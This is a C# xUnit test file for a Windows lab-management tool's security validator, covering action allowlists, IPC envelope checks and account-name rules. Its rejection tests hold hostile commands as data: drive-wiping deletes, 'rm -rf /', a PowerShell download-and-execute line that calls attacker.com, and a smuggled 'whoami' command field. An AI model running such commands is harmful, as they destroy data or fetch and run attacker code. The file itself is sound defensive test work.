using System;
using System.Collections.Generic;
using System.Text.Json;
using WinLab.Contracts;
using Xunit;

namespace WinLab.Tests
{
    public class SecurityValidatorTests
    {
        [Theory]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData(null)]
        public void ValidateAction_EmptyOrWhitespace_FailsWithEmptyAction(string? action)
        {
            var (isValid, error, errorCode) = SecurityValidator.ValidateAction(action!);

            Assert.False(isValid);
            Assert.Equal("EMPTY_ACTION", errorCode);
            Assert.NotNull(error);
        }

        [Theory]
        [InlineData("system.execute_shell")]
        [InlineData("admin.format_drive")]
        [InlineData("random.unknown_action")]
        public void ValidateAction_UnlistedAction_FailsWithUnauthorizedAction(string action)
        {
            var (isValid, error, errorCode) = SecurityValidator.ValidateAction(action);

            Assert.False(isValid);
            Assert.Equal("UNAUTHORIZED_ACTION", errorCode);
            Assert.Contains(action, error);
        }

        [Theory]
        [InlineData(IpcConstants.ActionApplyPolicies)]
        [InlineData(IpcConstants.ActionRollbackPolicies)]
        public void ValidateAction_MutatingActionsInFoundation_FailsWithPrivilegedExecutorDisabled(string action)
        {
            var (isValid, error, errorCode) = SecurityValidator.ValidateAction(action);

            Assert.False(isValid);
            Assert.Equal("PRIVILEGED_EXECUTOR_DISABLED", errorCode);
            Assert.Contains("disabled in the foundation desktop stage", error);
        }

        [Theory]
        [InlineData(IpcConstants.ActionQueryInventory)]
        [InlineData(IpcConstants.ActionQueryPolicyState)]
        [InlineData(IpcConstants.ActionQueryPreflight)]
        [InlineData(IpcConstants.ActionListPresets)]
        [InlineData(IpcConstants.ActionPreviewPolicyDiff)]
        [InlineData(IpcConstants.ActionValidateConfig)]
        [InlineData(IpcConstants.ActionCreateBaseline)]
        [InlineData(IpcConstants.ActionGetEnvironment)]
        public void ValidateAction_AllowedActions_Succeeds(string action)
        {
            var (isValid, error, errorCode) = SecurityValidator.ValidateAction(action);

            Assert.True(isValid);
            Assert.Null(error);
            Assert.Null(errorCode);
        }

        [Theory]
        [InlineData("powershell.exe -c evil")]
        [InlineData("cmd.exe /c del /f c:\\")]
        [InlineData("pwsh.exe -Command Remove-Item C:\\Windows")]
        [InlineData("iex (New-Object Net.WebClient).DownloadString('http://attacker.com')")]
        [InlineData("wscript.shell Run('malware.exe')")]
        [InlineData("eval('malicious')")]
        [InlineData("bash -c 'rm -rf /'")]
        public void ValidateNoArbitraryShell_ForbiddenPatterns_RejectsWithExplanation(string payload)
        {
            var (isSafe, error) = SecurityValidator.ValidateNoArbitraryShell(payload);

            Assert.False(isSafe);
            Assert.Contains("Forbidden executable or script pattern detected", error);
        }

        [Fact]
        public void ValidateNoArbitraryShell_SafeJsonPayload_Passes()
        {
            string safe = "{\"profileName\": \"Microlins Lab\", \"studentUser\": \"Aluno\", \"adminUser\": \"Administrador\"}";
            var (isSafe, error) = SecurityValidator.ValidateNoArbitraryShell(safe);

            Assert.True(isSafe);
            Assert.Null(error);
        }

        [Theory]
        [InlineData(null, "Admin")]
        [InlineData("", "Admin")]
        [InlineData("   ", "Admin")]
        [InlineData("Aluno", null)]
        [InlineData("Aluno", "")]
        [InlineData("Aluno", "   ")]
        public void ValidateAccountNames_EmptyNames_FailsValidation(string? student, string? admin)
        {
            var (isValid, error) = SecurityValidator.ValidateAccountNames(student, admin);

            Assert.False(isValid);
            Assert.NotNull(error);
        }

        [Theory]
        [InlineData("Aluno", "Aluno")]
        [InlineData("aluno", "ALUNO")]
        [InlineData("  Admin  ", "admin")]
        public void ValidateAccountNames_EqualAccounts_FailsValidation(string student, string admin)
        {
            var (isValid, error) = SecurityValidator.ValidateAccountNames(student, admin);

            Assert.False(isValid);
            Assert.Contains("não pode ser idêntica", error);
        }

        [Fact]
        public void ValidateAccountNames_DistinctValidNames_Succeeds()
        {
            var (isValid, error) = SecurityValidator.ValidateAccountNames("Aluno", "AdministradorLocal");

            Assert.True(isValid);
            Assert.Null(error);
        }

        [Fact]
        public void ValidateEnvelopeSchema_ValidEnvelope_Succeeds()
        {
            string json = """
            {
                "id": "env-12345",
                "version": "1.0.0",
                "type": "query",
                "action": "inventory.query",
                "payload": {}
            }
            """;

            using var doc = JsonDocument.Parse(json);
            var (isValid, envelopeId, error, errorCode) = SecurityValidator.ValidateEnvelopeSchema(doc.RootElement);

            Assert.True(isValid);
            Assert.Equal("env-12345", envelopeId);
            Assert.Null(error);
            Assert.Null(errorCode);
        }

        [Fact]
        public void ValidateEnvelopeSchema_PayloadWithDisallowedCommandField_FailsWithForbiddenCommandField()
        {
            string json = """
            {
                "id": "env-attack",
                "version": "1.0.0",
                "type": "command",
                "action": "config.validate",
                "payload": {
                    "command": "whoami"
                }
            }
            """;

            using var doc = JsonDocument.Parse(json);
            var (isValid, envelopeId, error, errorCode) = SecurityValidator.ValidateEnvelopeSchema(doc.RootElement);

            Assert.False(isValid);
            Assert.Equal("FORBIDDEN_COMMAND_FIELD", errorCode);
            Assert.Contains("Disallowed command property", error);
        }

        [Fact]
        public void ValidateEnvelope_GenericObject_ValidatesCorrectly()
        {
            var validEnvelope = new IpcEnvelope<string>
            {
                Id = Guid.NewGuid().ToString("D"),
                Type = "query",
                Action = IpcConstants.ActionQueryInventory,
                Payload = "safe"
            };

            var (isValid, error, errorCode) = SecurityValidator.ValidateEnvelope(validEnvelope);

            Assert.True(isValid);
            Assert.Null(error);
            Assert.Null(errorCode);

            var invalidEnvelope = new IpcEnvelope<string>
            {
                Id = "",
                Type = "query",
                Action = IpcConstants.ActionQueryInventory
            };

            var (isInvalid, idError, idErrorCode) = SecurityValidator.ValidateEnvelope(invalidEnvelope);
            Assert.False(isInvalid);
            Assert.Equal("INVALID_ENVELOPE_ID", idErrorCode);
        }

        [Theory]
        [InlineData('"')]
        [InlineData('/')]
        [InlineData('\\')]
        [InlineData('[')]
        [InlineData(']')]
        [InlineData(':')]
        [InlineData(';')]
        [InlineData('|')]
        [InlineData('=')]
        [InlineData(',')]
        [InlineData('+')]
        [InlineData('*')]
        [InlineData('?')]
        [InlineData('<')]
        [InlineData('>')]
        [InlineData('@')]
        public void ValidateAccountNames_ForbiddenCharacters_RejectedForStudentAndAdmin(char c)
        {
            // Test student account with forbidden character
            string studentWithChar = $"User{c}Test";
            var (studentValid, studentError) = SecurityValidator.ValidateAccountNames(studentWithChar, "ValidAdmin");
            Assert.False(studentValid);
            Assert.Contains("Nome de usuário contém caracteres inválidos", studentError);
            Assert.Contains(c.ToString(), studentError);

            // Test admin account with forbidden character
            string adminWithChar = $"Admin{c}Test";
            var (adminValid, adminError) = SecurityValidator.ValidateAccountNames("ValidStudent", adminWithChar);
            Assert.False(adminValid);
            Assert.Contains("Nome de usuário contém caracteres inválidos", adminError);
            Assert.Contains(c.ToString(), adminError);
        }

        [Theory]
        [InlineData("123456789012345678901")] // 21 chars
        [InlineData("NomeMuitoLongoComMaisDeVinteCaracteres")]
        [InlineData("  123456789012345678901  ")] // 21 chars after trim
        public void ValidateAccountNames_LengthGreaterThan20_RejectedForStudentAndAdmin(string longName)
        {
            // Student
            var (studentValid, studentError) = SecurityValidator.ValidateAccountNames(longName, "ValidAdmin");
            Assert.False(studentValid);
            Assert.Equal("Nome de usuário não pode ter mais de 20 caracteres.", studentError);

            // Admin
            var (adminValid, adminError) = SecurityValidator.ValidateAccountNames("ValidStudent", longName);
            Assert.False(adminValid);
            Assert.Equal("Nome de usuário não pode ter mais de 20 caracteres.", adminError);
        }

        [Fact]
        public void ValidateAccountNames_LengthUpTo20AfterTrim_Accepted()
        {
            string name20 = "12345678901234567890"; // exactly 20 chars
            var (valid, error) = SecurityValidator.ValidateAccountNames(name20, "ValidAdmin");
            Assert.True(valid);
            Assert.Null(error);

            string name20Padded = "  12345678901234567890  "; // 20 chars after trim
            var (validPadded, errorPadded) = SecurityValidator.ValidateAccountNames(name20Padded, "ValidAdmin");
            Assert.True(validPadded);
            Assert.Null(errorPadded);
        }

        [Theory]
        [InlineData(".")]
        [InlineData("..")]
        [InlineData("...")]
        [InlineData("....")]
        [InlineData("  ...  ")]
        [InlineData(". . .")]
        public void ValidateAccountNames_NamesConsistingOnlyOfPeriods_Rejected(string periodName)
        {
            // Student
            var (studentValid, studentError) = SecurityValidator.ValidateAccountNames(periodName, "ValidAdmin");
            Assert.False(studentValid);
            Assert.Equal("Nome de usuário não pode conter apenas pontos.", studentError);

            // Admin
            var (adminValid, adminError) = SecurityValidator.ValidateAccountNames("ValidStudent", periodName);
            Assert.False(adminValid);
            Assert.Equal("Nome de usuário não pode conter apenas pontos.", adminError);
        }

        [Fact]
        public void ValidateAccountNames_NamesWithPeriodsAndValidCharacters_Accepted()
        {
            var (valid, error) = SecurityValidator.ValidateAccountNames("aluno.lab01", "admin.rede");
            Assert.True(valid);
            Assert.Null(error);
        }

        [Theory]
        [InlineData("Aluno ", "Aluno")]
        [InlineData("Aluno", "Aluno ")]
        [InlineData(" aluno ", "aluno")]
        [InlineData("  Admin  ", "ADMIN")]
        [InlineData("Aluno", "  ALUNO  ")]
        public void ValidateAccountNames_WhitespacePaddedEquality_Rejected(string student, string admin)
        {
            var (isValid, error) = SecurityValidator.ValidateAccountNames(student, admin);
            Assert.False(isValid);
            Assert.Equal("A conta restrita não pode ser idêntica à conta de administrador.", error);
        }

        [Fact]
        public void ValidateStudentNotAdministrator_WhenStudentIsAdmin_ReturnsFalseWithError()
        {
            var accounts = new List<LocalUserDto>
            {
                new LocalUserDto { Name = "Administrador", IsAdmin = true },
                new LocalUserDto { Name = "AlunoAdmin", IsAdmin = true },
                new LocalUserDto { Name = "AlunoPadrao", IsAdmin = false }
            };

            var (isValid, error) = SecurityValidator.ValidateStudentNotAdministrator("AlunoAdmin", accounts);
            Assert.False(isValid);
            Assert.Equal("A conta selecionada possui privilégios de Administrador. O WinLab impede restrições em contas administrativas para prevenir perda de controle do computador.", error);

            // Case-insensitive and trimmed
            var (isValidTrimmed, errorTrimmed) = SecurityValidator.ValidateStudentNotAdministrator("  alunoadmin  ", accounts);
            Assert.False(isValidTrimmed);
            Assert.Equal("A conta selecionada possui privilégios de Administrador. O WinLab impede restrições em contas administrativas para prevenir perda de controle do computador.", errorTrimmed);
        }

        [Fact]
        public void ValidateStudentNotAdministrator_WhenStudentIsNotAdmin_ReturnsTrueWithNullError()
        {
            var accounts = new List<LocalUserDto>
            {
                new LocalUserDto { Name = "Administrador", IsAdmin = true },
                new LocalUserDto { Name = "AlunoPadrao", IsAdmin = false }
            };

            var (isValid, error) = SecurityValidator.ValidateStudentNotAdministrator("AlunoPadrao", accounts);
            Assert.True(isValid);
            Assert.Null(error);

            // Case-insensitive and trimmed
            var (isValidPadded, errorPadded) = SecurityValidator.ValidateStudentNotAdministrator("  alunopadrao  ", accounts);
            Assert.True(isValidPadded);
            Assert.Null(errorPadded);
        }

        [Theory]
        [InlineData(null)]
        [InlineData("")]
        [InlineData("   ")]
        public void ValidateStudentNotAdministrator_EmptyOrWhitespaceStudent_ReturnsTrue(string? emptyStudent)
        {
            var accounts = new List<LocalUserDto>
            {
                new LocalUserDto { Name = "Administrador", IsAdmin = true }
            };

            var (isValid, error) = SecurityValidator.ValidateStudentNotAdministrator(emptyStudent, accounts);
            Assert.True(isValid);
            Assert.Null(error);
        }

        [Fact]
        public void ValidateStudentNotAdministrator_NullAccounts_ReturnsTrue()
        {
            var (isValid, error) = SecurityValidator.ValidateStudentNotAdministrator("Aluno", null);
            Assert.True(isValid);
            Assert.Null(error);
        }

        [Fact]
        public void ValidateStudentNotAdministrator_UserNotFoundInAccounts_ReturnsTrue()
        {
            var accounts = new List<LocalUserDto>
            {
                new LocalUserDto { Name = "Administrador", IsAdmin = true }
            };

            var (isValid, error) = SecurityValidator.ValidateStudentNotAdministrator("NovoAluno", accounts);
            Assert.True(isValid);
            Assert.Null(error);
        }
    }
}
